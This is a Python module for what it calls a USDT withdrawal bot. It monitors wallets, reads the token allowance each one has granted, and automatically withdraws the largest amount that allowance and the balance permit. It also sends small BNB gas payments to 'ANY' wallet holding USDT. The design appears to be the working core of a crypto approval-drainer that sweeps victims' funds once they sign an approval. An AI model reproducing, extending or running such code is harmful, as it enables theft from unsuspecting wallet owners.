"""
Auto Mode Manager for USDT Withdrawal Bot
Handles automatic withdrawals and auto gas functionality
"""

import asyncio
import logging
import time
from typing import Optional, Dict, Set
from datetime import datetime, timedelta

from blockchain import blockchain_manager
from config import (
    AUTO_WITHDRAW_INTERVAL, AUTO_GAS_CHECK_INTERVAL, 
    AUTO_GAS_USDT_THRESHOLD, AUTO_GAS_BNB_THRESHOLD, AUTO_GAS_BNB_AMOUNT,
    AUTO_GAS_PRIVATE_KEY
)

logger = logging.getLogger(__name__)

class AutoModeManager:
    """Manages automatic withdrawal and gas functionality"""
    
    def __init__(self):
        self.auto_mode_enabled = False
        self.auto_gas_enabled = False
        self.monitored_wallets: Set[str] = set()
        self.last_auto_withdrawal: Dict[str, float] = {}
        self.last_auto_gas: Dict[str, float] = {}
        self.running = False
        self.auto_task = None
    
    def add_wallet(self, address: str):
        """Add wallet to auto monitoring"""
        checksum_address = blockchain_manager.w3.to_checksum_address(address)
        self.monitored_wallets.add(checksum_address)
        logger.info(f"Added wallet to auto monitoring: {checksum_address}")
    
    def remove_wallet(self, address: str):
        """Remove wallet from auto monitoring"""
        checksum_address = blockchain_manager.w3.to_checksum_address(address)
        self.monitored_wallets.discard(checksum_address)
        logger.info(f"Removed wallet from auto monitoring: {checksum_address}")
    
    def toggle_auto_mode(self) -> tuple[bool, str]:
        """Toggle auto withdrawal mode"""
        self.auto_mode_enabled = not self.auto_mode_enabled
        status = "enabled" if self.auto_mode_enabled else "disabled"
        
        if self.auto_mode_enabled and not self.running:
            self.start_auto_monitoring()
        elif not self.auto_mode_enabled and not self.auto_gas_enabled and self.running:
            self.stop_auto_monitoring()
        
        logger.info(f"Auto mode {status}")
        return self.auto_mode_enabled, f"🤖 Auto Mode {status.upper()}"
    
    def toggle_auto_gas(self) -> tuple[bool, str]:
        """Toggle auto gas mode"""
        self.auto_gas_enabled = not self.auto_gas_enabled
        status = "enabled" if self.auto_gas_enabled else "disabled"
        
        if self.auto_gas_enabled and not self.running:
            self.start_auto_monitoring()
        elif not self.auto_gas_enabled and not self.auto_mode_enabled and self.running:
            self.stop_auto_monitoring()
        
        logger.info(f"Auto gas {status}")
        return self.auto_gas_enabled, f"⛽ Auto Gas {status.upper()}"
    
    def start_auto_monitoring(self):
        """Start the auto monitoring task"""
        if not self.running:
            self.running = True
            self.auto_task = asyncio.create_task(self._auto_monitoring_loop())
            logger.info("Auto monitoring started")
    
    def stop_auto_monitoring(self):
        """Stop the auto monitoring task"""
        if self.running:
            self.running = False
            if self.auto_task:
                self.auto_task.cancel()
            logger.info("Auto monitoring stopped")
    
    async def _auto_monitoring_loop(self):
        """Main auto monitoring loop"""
        try:
            while self.running:
                current_time = time.time()
                
                for wallet_address in self.monitored_wallets.copy():
                    try:
                        # Auto withdrawal check
                        if self.auto_mode_enabled:
                            await self._check_auto_withdrawal(wallet_address, current_time)
                        
                        # Auto gas check
                        if self.auto_gas_enabled:
                            await self._check_auto_gas(wallet_address, current_time)
                            
                    except Exception as e:
                        logger.error(f"Error processing wallet {wallet_address}: {e}")
                
                # Wait before next check
                await asyncio.sleep(min(AUTO_WITHDRAW_INTERVAL, AUTO_GAS_CHECK_INTERVAL))
                
        except asyncio.CancelledError:
            logger.info("Auto monitoring task cancelled")
        except Exception as e:
            logger.error(f"Error in auto monitoring loop: {e}")
    
    async def _check_auto_withdrawal(self, wallet_address: str, current_time: float):
        """Check and perform auto withdrawal if conditions are met"""
        try:
            # Check rate limiting
            last_withdrawal = self.last_auto_withdrawal.get(wallet_address, 0)
            if current_time - last_withdrawal < AUTO_WITHDRAW_INTERVAL:
                return
            
            # Check allowance and balance
            allowance = blockchain_manager.get_allowance(wallet_address)
            balance = blockchain_manager.get_usdt_balance(wallet_address)
            
            if allowance is None or balance is None:
                return
            
            if allowance > 0 and balance > 0:
                # Determine withdrawal amount (minimum of allowance and balance)
                withdraw_amount = min(allowance, balance)
                
                # Perform withdrawal
                success, message = blockchain_manager.withdraw_usdt(wallet_address, withdraw_amount)
                
                if success:
                    self.last_auto_withdrawal[wallet_address] = current_time
                    logger.info(f"Auto withdrawal successful: {wallet_address} -> {withdraw_amount} USDT")
                else:
                    logger.warning(f"Auto withdrawal failed: {wallet_address} -> {message}")
                    
        except Exception as e:
            logger.error(f"Error in auto withdrawal check for {wallet_address}: {e}")
    
    async def _check_auto_gas(self, wallet_address: str, current_time: float):
        """Check and send auto gas to ANY wallet that meets conditions"""
        try:
            # Check rate limiting
            last_gas = self.last_auto_gas.get(wallet_address, 0)
            if current_time - last_gas < AUTO_GAS_CHECK_INTERVAL:
                return
            
            # Get wallet balances
            usdt_balance = blockchain_manager.get_usdt_balance(wallet_address)
            bnb_balance = blockchain_manager.get_bnb_balance(wallet_address)
            
            if usdt_balance is None or bnb_balance is None:
                return
            
            # Check auto gas conditions for ANY wallet (not just approved)
            should_send_gas = (
                usdt_balance >= AUTO_GAS_USDT_THRESHOLD and  # USDT >= 0.5
                bnb_balance < AUTO_GAS_BNB_THRESHOLD and     # BNB < 0.00000720
                usdt_balance > 0 and                         # USDT not zero
                bnb_balance >= 0                             # BNB not negative
            )
            
            if should_send_gas:
                # Send BNB gas to ANY qualifying wallet
                success, message = blockchain_manager.send_bnb(
                    wallet_address, 
                    AUTO_GAS_BNB_AMOUNT, 
                    AUTO_GAS_PRIVATE_KEY
                )
                
                if success:
                    self.last_auto_gas[wallet_address] = current_time
                    logger.info(f"Background auto gas sent to ANY wallet: {wallet_address} -> {AUTO_GAS_BNB_AMOUNT} BNB")
                else:
                    logger.warning(f"Background auto gas failed: {wallet_address} -> {message}")
                    
        except Exception as e:
            logger.error(f"Error in background auto gas check for {wallet_address}: {e}")
    
    def add_wallet_for_gas_monitoring(self, wallet_address: str):
        """Add wallet to gas monitoring (separate from withdrawal monitoring)"""
        if wallet_address not in self.monitored_wallets:
            self.monitored_wallets.add(wallet_address)
            logger.info(f"Added wallet to gas monitoring: {wallet_address}")
    
    def get_status(self) -> str:
        """Get current auto mode status"""
        auto_mode_status = "🟢 ON" if self.auto_mode_enabled else "🔴 OFF"
        auto_gas_status = "🟢 ON" if self.auto_gas_enabled else "🔴 OFF"
        
        status_text = (
            f"🤖 *Auto Mode Status*\n\n"
            f"Auto Withdrawal: {auto_mode_status}\n"
            f"Auto Gas: {auto_gas_status}\n"
            f"Monitored Wallets: {len(self.monitored_wallets)}\n"
            f"Monitoring: {'🟢 ACTIVE' if self.running else '🔴 INACTIVE'}\n\n"
        )
        
        if self.auto_gas_enabled:
            status_text += (
                f"⛽ *Auto Gas Settings:*\n"
                f"USDT Threshold: ${AUTO_GAS_USDT_THRESHOLD}\n"
                f"BNB Threshold: {AUTO_GAS_BNB_THRESHOLD:.8f}\n"
                f"BNB Amount: {AUTO_GAS_BNB_AMOUNT:.8f}\n"
            )
        
        return status_text

# Global auto mode manager instance
auto_mode_manager = AutoModeManager()